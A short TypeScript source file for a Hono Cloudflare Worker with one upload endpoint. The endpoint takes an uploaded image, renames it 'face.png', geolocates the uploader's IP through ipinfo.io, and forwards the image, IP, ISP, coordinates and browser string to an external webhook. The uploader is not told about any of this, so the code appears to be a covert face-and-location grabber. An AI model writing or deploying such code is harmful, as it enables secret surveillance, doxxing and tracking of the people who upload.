import { Hono } from "hono";
import dotenv from "dotenv";
import { getConnInfo/*, serveStatic*/ } from "hono/cloudflare-workers";

const app = new Hono();

app.post("/upload", async (c) => {
  const formData = await c.req.formData();
  const file = formData.get("file");
  const info = getConnInfo(c);
  if (!file) {
    return c.text("No file uploaded", 400);
  }

  const ip = info.remote.address;

  const ipInfoJson = await (await fetch(`https://ipinfo.io/${ip}/json`)).json();

  const message = `IP: ${ip} (${ipInfoJson.city}, ${ipInfoJson.region}, ${ipInfoJson.country})\nISP: ${ipInfoJson.org}\n位置: ${ipInfoJson.loc}\nUA: ${c.req.header("User-Agent") || "Not Found"}\n\n`;

  const buffer = await file.arrayBuffer();

  const fd = new FormData();
  fd.append("file", new Blob([buffer]), "face.png");
  fd.append("payload_json", JSON.stringify({ content: message }));

  const response = await fetch(process.env.WEBHOOK_URL, {
    method: "POST",
    body: fd,
  });
  if (!response.ok) {
    return c.text("Failed to upload file", 500);
  }

  return c.text("Done");
});

//app.get('*', serveStatic({ root: './dist' }));

export default app;
